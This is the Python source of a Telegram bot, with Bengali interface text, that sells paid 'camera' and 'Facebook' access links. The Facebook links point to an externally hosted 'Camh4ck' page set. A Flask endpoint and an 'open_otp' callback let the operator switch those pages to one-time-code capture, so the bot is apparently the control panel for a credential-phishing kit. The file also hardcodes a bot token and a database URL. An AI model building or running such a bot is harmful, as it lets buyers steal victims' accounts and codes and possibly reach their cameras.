import telebot
from telebot import types
import requests
import time
from flask import Flask, jsonify
from threading import Thread
import os

# --- সেটিংস ---
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
ADMIN_ID = 7068444019
ADMIN_USERNAME = "bcdatp10" 
CHANNEL_ID = "@hackingacademyX"
FIREBASE_URL = "https://bot-user-deta-default-rtdb.asia-southeast1.firebasedatabase.app/"
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

bot = telebot.TeleBot(BOT_TOKEN)
user_commands = {} 

# --- রেন্ডার ও রিয়েল-টাইম সার্ভার ---
app = Flask('')
@app.route('/')
def home(): return "Zord Bot is Running!"
@app.route('/get_command/<user_id>')
def get_command(user_id):
    status = user_commands.get(str(user_id), "loading")
    return jsonify({"status": status})

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
def keep_alive(): Thread(target=run).start()

# --- ডেটাবেস ফাংশন ---
def get_user(user_id):
    res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
    return res.json() or {"coins": 0, "diamonds": 0, "referral_count": 0, "status": "active"}

def save_user(user_id, data):
    requests.patch(f"{FIREBASE_URL}/users/{user_id}.json", json=data)

def get_promo(code):
    res = requests.get(f"{FIREBASE_URL}/promo/{code}.json")
    return res.json()

def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- মেনু ও বাটন ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Start", "💰 My Assets")
    markup.row("👥 Refer", "🔥 Access")
    markup.row("ℹ️ Info")
    return markup

def join_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("চ্যানেলে জয়েন করুন 📢", url=f"https://t.me/{CHANNEL_ID.replace('@', '')}"))
    markup.add(types.InlineKeyboardButton("জয়েন করেছি ✅", callback_data="verify_join"))
    return markup

# --- কমান্ড হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = str(message.chat.id)
    args = message.text.split()
    user_data = requests.get(f"{FIREBASE_URL}/users/{user_id}.json").json()
    
    if user_data is None:
        new_user = {"coins": 0, "diamonds": 0, "referral_count": 0, "status": "pending"}
        if len(args) > 1 and args[1].isdigit():
            new_user["referred_by"] = args[1]
        save_user(user_id, new_user)

    if not is_subscribed(user_id):
        bot.send_message(user_id, "⚠️ বোট ব্যবহার করতে আগে চ্যানেলে জয়েন করুন!", reply_markup=join_markup())
        return
    bot.send_message(user_id, "👋 স্বাগতম!", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = str(message.chat.id)
    if not is_subscribed(user_id):
        bot.send_message(user_id, "❌ আপনি চ্যানেল থেকে লিভ নিয়েছেন!", reply_markup=join_markup())
        return

    text = message.text
    data = get_user(user_id)

    if text == "🚀 Start":
        bot.send_message(user_id, "বোট রেডি!", reply_markup=main_menu())
    elif text == "💰 My Assets":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 কিনুন", url=f"https://t.me/{ADMIN_USERNAME}"),
                   types.InlineKeyboardButton("🎁 রিডিম কোড", callback_data="redeem_ui"))
        if int(user_id) == ADMIN_ID:
            markup.add(types.InlineKeyboardButton("⚙️ অ্যাডমিন প্যানেল", callback_data="admin_panel"))
        bot.send_message(user_id, f"📊 **ব্যালেন্স:**\n\n🪙 Coins: {data.get('coins', 0)}\n💎 Diamonds: {data.get('diamonds', 0)}", reply_markup=markup, parse_mode='Markdown')
    elif text == "👥 Refer":
        bot_user = bot.get_me().username
        link = f"https://t.me/{bot_user}?start={user_id}"
        bot.send_message(user_id, f"🔗 রেফার লিঙ্ক: `{link}`\n\nসফল ভেরিফায়েড রেফারে ৫০ কয়েন!", parse_mode='Markdown')
    elif text == "🔥 Access":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📸 ক্যামেরা (10 Coin)", callback_data="buy_cam"),
                   types.InlineKeyboardButton("🔐 ফেসবুক (5 Diamond)", callback_data="buy_fb"))
        bot.send_message(user_id, "কি অ্যাক্সেস করতে চান?", reply_markup=markup)
    elif text == "ℹ️ Info":
        ref_count = data.get('referral_count', 0)
        bot.send_message(user_id, f"🤖 **ইনফো**\n\n✅ সফল রেফার: {ref_count} জন\n⚠️ লিঙ্ক মেয়াদ: ১ ঘণ্টা", parse_mode='Markdown')

# --- কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = str(call.message.chat.id)
    data = get_user(user_id)

    if call.data == "verify_join":
        if is_subscribed(user_id):
            u_info = requests.get(f"{FIREBASE_URL}/users/{user_id}.json").json()
            if u_info and u_info.get('status') == 'pending':
                ref_id = u_info.get('referred_by')
                if ref_id:
                    r_owner = get_user(ref_id)
                    r_owner['coins'] += 50
                    r_owner['referral_count'] += 1
                    save_user(ref_id, r_owner)
                    bot.send_message(ref_id, "🎉 কেউ আপনার লিঙ্কে জয়েন করে ভেরিফাই করেছে! +৫০ কয়েন।")
                u_info['status'] = 'active'
                save_user(user_id, u_info)
            bot.delete_message(user_id, call.message.message_id)
            bot.send_message(user_id, "বোট একটিভ হয়েছে!", reply_markup=main_menu())
        else: bot.answer_callback_query(call.id, "আগে জয়েন করুন!", show_alert=True)

    elif call.data == "admin_panel" and int(user_id) == ADMIN_ID:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("➕ নতুন রিডিম কোড তৈরি", callback_data="gen_code"))
        bot.send_message(user_id, "অ্যাডমিন প্যানেল:", reply_markup=markup)

    elif call.data == "gen_code":
        msg = bot.send_message(user_id, "১. কোডের নাম দিন (যেমন: GIFT100):")
        bot.register_next_step_handler(msg, get_code_name)

    elif call.data.startswith("set_type_"):
        parts = call.data.split("_")
        asset_type, code_name = parts[2], parts[3]
        msg = bot.send_message(user_id, f"৩. কত {asset_type} দিতে চান?")
        bot.register_next_step_handler(msg, lambda m: get_amount(m, code_name, asset_type))

    elif call.data == "redeem_ui":
        msg = bot.send_message(user_id, "প্রোমো কোডটি দিন:")
        bot.register_next_step_handler(msg, process_redeem)

    elif call.data == "buy_fb":
        if data.get('diamonds', 0) >= 5:
            data['diamonds'] -= 5
            save_user(user_id, data)
            user_commands[user_id] = "loading"
            direct_link = f"{BASE_URL}fb/?id={user_id}&exp={int(time.time())+3600}"
            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক:\n{direct_link}")
        else: bot.answer_callback_query(call.id, "ডায়মন্ড নেই!", show_alert=True)

    elif call.data.startswith("open_otp_"):
        target_id = call.data.split("_")[2]
        user_commands[str(target_id)] = "show_otp"
        bot.answer_callback_query(call.id, "✅ ওটিপি পেজ ওপেন হয়েছে!")

# --- রিডিম কোড প্রসেস ফাংশন ---
def get_code_name(message):
    code_name = message.text
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🪙 Coin", callback_data=f"set_type_coin_{code_name}"),
               types.InlineKeyboardButton("💎 Diamond", callback_data=f"set_type_dia_{code_name}"))
    bot.send_message(message.chat.id, f"২. কোডটি কিসের হবে?", reply_markup=markup)

def get_amount(message, code_name, asset_type):
    amount = message.text
    msg = bot.send_message(message.chat.id, "৪. ইউজার লিমিট দিন:")
    bot.register_next_step_handler(msg, lambda m: finalize_code(m, code_name, asset_type, amount))

def finalize_code(message, code_name, asset_type, amount):
    limit = int(message.text)
    payload = {"limit": limit}
    if asset_type == "coin": payload["coin_amount"] = int(amount)
    else: payload["diamond_amount"] = int(amount)
    requests.patch(f"{FIREBASE_URL}/promo/{code_name}.json", json=payload)
    bot.send_message(message.chat.id, f"✅ কোড: `{code_name}` তৈরি হয়েছে।")

def process_redeem(message):
    code = message.text
    u_id = str(message.chat.id)
    promo = get_promo(code)
    if promo:
        used_by = promo.get('used_by', {})
        if u_id in used_by or len(used_by) >= promo.get('limit', 1):
            bot.send_message(u_id, "❌ লিমিট শেষ!")
            return
        u_data = get_user(u_id)
        if 'coin_amount' in promo: u_data['coins'] += promo['coin_amount']
        elif 'diamond_amount' in promo: u_data['diamonds'] += promo['diamond_amount']
        save_user(u_id, u_data)
        requests.patch(f"{FIREBASE_URL}/promo/{code}/used_by.json", json={u_id: True})
        bot.send_message(u_id, "✅ রিডিম সফল!")
    else: bot.send_message(u_id, "❌ ভুল কোড!")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
